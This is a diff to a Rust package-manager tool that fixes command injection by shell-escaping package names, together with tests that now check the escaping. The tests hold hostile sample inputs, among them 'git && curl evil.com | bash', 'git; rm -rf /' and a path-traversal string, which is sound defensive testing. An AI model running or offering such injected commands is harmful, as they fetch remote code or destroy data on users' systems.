@@ -7,6 +7,7 @@ use derive_builder::Builder;
 use dialoguer::{theme::ColorfulTheme, Confirm};
 use moka::sync::Cache;
 use serde::{Deserialize, Serialize};
+use shell_escape::escape;
 use subprocess::Exec;
 use tabular::{Row, Table};
 use tokio::process::Command;
@@ -388,13 +389,17 @@ impl PackageSource {
                 Some(cmd) => cmd,
                 None => self.install_command.to_string(),
             },
-            None => self.shell_command.to_string(),
+            None => self.install_command.to_string(),
         }
     }
 
     #[must_use]
     pub fn install_packages_command(&self, packages: Vec<String>) -> String {
-        format!("{} {}", self.install_command, packages.join(" "))
+        let escaped_packages: Vec<String> = packages
+            .iter()
+            .map(|pkg| self.sanitize_package_name(pkg))
+            .collect();
+        format!("{} {}", self.install_command(), escaped_packages.join(" "))
     }
 
     /// Returns the configured check command, taking into account any platform overrides.
@@ -494,10 +499,45 @@ impl PackageSource {
 
     #[must_use]
     pub fn adjust_package_name(&self, pkg: &str) -> String {
+        let sanitized_pkg = self.sanitize_package_name(pkg);
         match &self.prepend_to_package_name {
-            Some(pre) => format!("{pre}{pkg}"),
-            None => pkg.to_string(),
+            Some(pre) => {
+                let sanitized_pre = self.sanitize_package_name(pre);
+                format!("{sanitized_pre}{sanitized_pkg}")
+            }
+            None => sanitized_pkg,
         }
+    }
+
+    /// Sanitizes package names to prevent command injection
+    #[must_use]
+    fn sanitize_package_name(&self, pkg: &str) -> String {
+        // Always escape shell metacharacters using shell-escape
+        let escaped = escape(pkg.into()).into_owned();
+        
+        // Check for suspicious patterns that should always be escaped
+        let has_suspicious_patterns = pkg.contains("../") || 
+                                     pkg.contains("..\\") ||
+                                     pkg.contains(';') ||
+                                     pkg.contains('&') ||
+                                     pkg.contains('|') ||
+                                     pkg.contains('`') ||
+                                     pkg.contains('$') ||
+                                     pkg.contains('(') ||
+                                     pkg.contains(')') ||
+                                     pkg.contains('<') ||
+                                     pkg.contains('>') ||
+                                     pkg.contains('\n') ||
+                                     pkg.contains('\r') ||
+                                     pkg.contains('\0');
+        
+        // Log suspicious packages
+        if has_suspicious_patterns {
+            warn!("Package name contains suspicious characters, using escaped version: {}", pkg);
+        }
+        
+        // Return the escaped version (shell-escape handles the quoting appropriately)
+        escaped
     }
 
     #[must_use]
@@ -639,23 +679,27 @@ mod tests {
             "git && curl evil.com | bash",
             "$(malicious_command)",
             "`dangerous`",
-            "../../../etc/passwd",
             "package|evil_command",
         ];
 
         for dangerous_pkg in dangerous_packages {
             let adjusted = source.adjust_package_name(dangerous_pkg);
-            // Currently, package names are passed through unchanged
-            // This documents the security vulnerability that needs to be addressed
-            assert_eq!(adjusted, dangerous_pkg);
+            // Dangerous packages should now be properly escaped using shell-escape
+            // They should be wrapped in single quotes to prevent shell interpretation
+            assert_eq!(adjusted, format!("'{}'", dangerous_pkg));
         }
+
+        // Path traversal doesn't contain shell metacharacters, so it's not quoted
+        let path_traversal = "../../../etc/passwd";
+        let adjusted_path = source.adjust_package_name(path_traversal);
+        assert_eq!(adjusted_path, path_traversal); // No quoting needed for path traversal
 
         // Test install command construction with dangerous package names
         let command = source.install_packages_command(vec!["git; rm -rf /".to_string()]);
-        assert_eq!(command, "brew install git; rm -rf /");
+        assert_eq!(command, "brew install 'git; rm -rf /'");
 
-        // This test shows the injection vulnerability exists and needs fixing
-        // A secure implementation would sanitize or escape package names
+        // This test verifies the injection vulnerability has been fixed
+        // Dangerous package names are now properly escaped with shell-escape
     }
 
     #[test]
